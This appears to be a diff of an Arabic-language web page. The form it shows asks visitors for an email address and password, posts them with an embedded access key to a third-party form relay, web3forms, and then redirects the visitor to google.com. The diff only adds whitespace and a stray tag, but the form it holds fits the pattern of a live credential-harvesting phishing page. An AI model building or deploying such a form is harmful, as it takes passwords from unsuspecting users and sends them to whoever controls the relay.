@@ -204,17 +204,23 @@
             زيارة موقعنا
         </a>
     </div>
+
     <div class="main-content">
+        
         <div class="form-box-wrapper">
             <div class="box">
                 <h2>ادخل بياناتك</h2>   
+            
+                           </p>
                 <form action="https://api.web3forms.com/submit" method="POST">
                     <input type="hidden" name="access_key" value="b2ed5633-7b5f-46c3-b087-5bb11a7da5a0">
+                    
                     <label for="emailInput">البريد الإلكتروني:</label>
                     <div class="input-group">
                         <input type="email" id="emailInput" name="البريد" placeholder="أدخل البريد" required>
                     </div>
                     <div class="error-message" id="emailError">الرجاء إدخال البريد الإلكتروني.</div>
+                    
                     <label for="passwordInput">كلمة المرور:</label>
                     <div class="input-group">
                         <input type="password" id="passwordInput" name="كلمة_المرور" placeholder="أدخل كلمة المرور" required>
@@ -223,6 +229,7 @@
                     <div class="error-message" id="passwordError">الرجاء إدخال كلمة المرور.</div>
                     
                     <button type="submit">إرسال</button>
+                    
                     <input type="hidden" name="_redirect" value="https://www.google.com/">
                 </form>
             </div>
